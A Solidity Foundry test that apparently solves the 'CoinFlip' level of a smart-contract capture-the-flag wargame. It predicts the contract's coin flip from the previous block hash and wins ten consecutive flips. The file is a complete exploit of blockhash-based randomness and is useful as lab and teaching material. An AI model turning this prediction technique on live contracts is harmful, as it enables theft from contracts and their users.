// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./utils/BaseTest.sol";
import "../src/levels/3-CoinFlip/CoinFlip.sol";
import "../src/levels/3-CoinFlip/CoinFlipFactory.sol";

contract CoinFlipTest is Test, BaseTest {
    CoinFlip public level;

    constructor() {
        levelFactory = new CoinFlipFactory();
    }

    function setUp() public override {
        super.setUp();
        levelAddr = payable(_createLevelInstance());
        level = CoinFlip(levelAddr);
    }

    function testAttack() public {
        _attack();
        _validateLevel();
    }

    function _attack() public override {
        vm.startPrank(attacker);

        for (uint256 i = 0; i < 10; i++) {
            bool nextGuess = _guessFlip(true);
            level.flip(nextGuess);

            // advance block
            vm.roll(block.number + 1);
        }

        vm.stopPrank();
    }

    function _guessFlip(bool _guess) internal view returns (bool) {
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / factor;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            return true;
        } else {
            return false;
        }
    }
}
